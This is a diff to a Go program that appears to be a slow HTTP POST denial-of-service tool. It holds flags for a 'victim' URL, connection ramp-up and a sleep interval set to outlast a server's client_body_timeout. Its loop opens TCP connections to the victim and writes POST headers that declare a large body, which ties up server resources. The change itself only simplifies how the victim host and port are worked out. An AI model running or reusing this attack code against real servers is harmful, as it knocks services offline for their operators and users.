@@ -51,7 +51,6 @@ var (
 	goMaxProcs     = flag.Int("goMaxProcs", runtime.NumCPU(), "The maximum number of CPUs to use. Don't touch :)")
 	rampUpInterval = flag.Duration("rampUpInterval", 100*time.Millisecond, "Interval between new connections' acquisitions")
 	sleepInterval  = flag.Duration("sleepInterval", 50*time.Second, "Sleep interval between subsequent packets sending. Adjust to client_body_timeout")
-	victimHostPort = flag.String("victimHostPort", "", "Victim's ip and port. Set if the victim's host has multiple ip addresses. Otherwise it is derived from victimUrl")
 	victimUrl      = flag.String("victimUrl", "http://127.0.0.1/", "Victim's url (must support http POST)")
 )
 
@@ -67,7 +66,6 @@ func main() {
 	fmt.Printf("goMaxProcs=%d\n", *goMaxProcs)
 	fmt.Printf("rampUpInterval=%s\n", *rampUpInterval)
 	fmt.Printf("sleepInterval=%s\n", *sleepInterval)
-	fmt.Printf("victimHostPort=%s\n", *victimHostPort)
 	fmt.Printf("victimUrl=%s\n", *victimUrl)
 
 	runtime.GOMAXPROCS(*goMaxProcs)
@@ -76,11 +74,9 @@ func main() {
 	if err != nil {
 		log.Fatalf("Cannot parse victimUrl=[%s]: [%s]\n", victimUrl, err)
 	}
-	if *victimHostPort == "" {
-		*victimHostPort = victimUri.Host
-	}
-	if !strings.Contains(*victimHostPort, ":") {
-		*victimHostPort = net.JoinHostPort(*victimHostPort, "80")
+	victimHostPort := victimUri.Host
+	if !strings.Contains(victimHostPort, ":") {
+		victimHostPort = net.JoinHostPort(victimHostPort, "80")
 	}
 	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n",
 		victimUri.RequestURI(), victimUri.Host, *contentLength))
@@ -89,9 +85,9 @@ func main() {
 	go activeConnectionsCounter(activeConnectionsCh)
 	for {
 		time.Sleep(*rampUpInterval)
-		conn, err := net.Dial("tcp", *victimHostPort)
+		conn, err := net.Dial("tcp", victimHostPort)
 		if err != nil {
-			log.Printf("Couldn't esablish connection to [%s]: [%s]\n", *victimHostPort, err)
+			log.Printf("Couldn't esablish connection to [%s]: [%s]\n", victimHostPort, err)
 			continue
 		}
 		if _, err = conn.Write(requestHeader); err != nil {
